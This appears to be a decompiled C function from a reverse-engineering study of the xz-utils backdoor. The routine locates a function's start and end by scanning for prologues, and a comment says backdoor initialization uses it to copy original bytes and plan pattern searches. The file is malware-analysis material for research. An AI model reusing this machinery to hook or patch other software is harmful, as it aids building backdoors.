// /home/kali/xzre-ghidra/xzregh/100BA0_find_function.c
// Function: find_function @ 0x100BA0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_function(u8 * code_start, void * * func_start, void * * func_end, u8 * search_base, u8 * code_end, FuncFindType find_mode)


/*
 * AutoDoc: Combines the prologue scan with a forward sweep to determine both the start and end addresses of a function. Backdoor initialization relies on it when it needs exact bounds for copying original bytes or scheduling follow-up pattern searches.
 */

#include "xzre_types.h"

BOOL find_function(u8 *code_start,void **func_start,void **func_end,u8 *search_base,u8 *code_end,
                  FuncFindType find_mode)

{
  BOOL BVar1;
  u8 *puVar2;
  BOOL found;
  u8 *search_to;
  u8 *search_from;
  u8 *p;
  
  p = (u8 *)0x0;
  puVar2 = code_start;
  if (func_start != (void **)0x0) {
    while ((search_base < puVar2 &&
           (BVar1 = find_function_prologue(puVar2,code_end,&p,find_mode), BVar1 == FALSE))) {
      puVar2 = puVar2 + -1;
    }
    puVar2 = p;
    if ((p == (u8 *)0x0) ||
       ((p == search_base &&
        (BVar1 = find_function_prologue(search_base,code_end,(u8 **)0x0,find_mode), BVar1 == FALSE))
       )) {
      return FALSE;
    }
    *func_start = puVar2;
  }
  puVar2 = code_start + 1;
  if (func_end != (void **)0x0) {
    for (; puVar2 < code_end + -4; puVar2 = puVar2 + 1) {
      BVar1 = find_function_prologue(puVar2,code_end,(u8 **)0x0,find_mode);
      if (BVar1 != FALSE) goto LAB_00100c78;
    }
    if ((code_end + -4 != puVar2) ||
       (BVar1 = find_function_prologue(puVar2,code_end,(u8 **)0x0,find_mode), BVar1 != FALSE)) {
LAB_00100c78:
      code_end = puVar2;
    }
    *func_end = code_end;
  }
  return TRUE;
}

